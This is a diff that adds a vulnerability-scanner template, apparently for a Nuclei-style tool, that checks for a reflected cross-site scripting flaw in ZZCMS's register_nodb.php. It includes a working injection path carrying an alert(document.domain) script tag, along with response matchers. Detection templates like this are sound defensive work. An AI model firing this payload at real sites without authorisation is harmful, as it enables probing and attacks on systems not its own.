@@ -1,0 +1,26 @@
+id: zzcms-register-xss
+name: Zzcms `register_nodb.php` - Cross Site Scripting
+severity: medium
+confidence: confirmed
+description: Identified a reflected Cross-Site Scripting (XSS) vulnerability in register_nodb.php of ZZCMS, which allowed
+  injection of malicious scripts via user-supplied input.
+reference: https://github.com/Sinon2003/cve/blob/main/zzcms/xss-register_nodb.php.md
+tags:
+- xss
+- zzcms
+- vuln
+requests:
+- method: GET
+  path: /3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>
+  matchers:
+  - type: body
+    words:
+    - '"><script>alert(document.domain)</script>'
+    - example=register
+  - type: body
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
